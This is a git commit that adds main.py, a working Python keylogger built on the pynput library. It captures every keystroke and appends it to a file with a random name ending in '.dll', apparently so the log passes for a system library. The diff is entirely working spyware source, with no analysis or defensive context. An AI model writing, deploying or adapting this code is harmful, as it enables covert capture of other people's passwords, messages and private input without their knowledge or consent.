cf58f3d38e29ba414688f701715726733a6ddeb4
fearherbs1 <fearherbs1@gmail.com>
2021-06-23 22:50:48 -0400

    basic stuff

---
+++ main.py
@@ -0,0 +1,38 @@
+import pynput
+import base64
+import random
+import string
+from pynput import keyboard
+
+# generate a random filename for our log file
+fname = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10)) + ".dll"
+
+
+def log():
+
+    def on_press(key):
+        kl = []
+        ks = str(key).strip("'")
+        kl.append(ks)
+        print(ks)
+        log_file(kl)
+        kl = []
+
+    def on_release(key):
+        r = str(key)
+
+    def log_file(kl):
+        with open(fname, "a+") as f:
+            for key in kl:
+                if "Key.space" in key:
+                    f.write("\n")
+                else:
+                    f.write(key)
+
+
+    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+    listener.start()
+    listener.join()
+
+
+log()
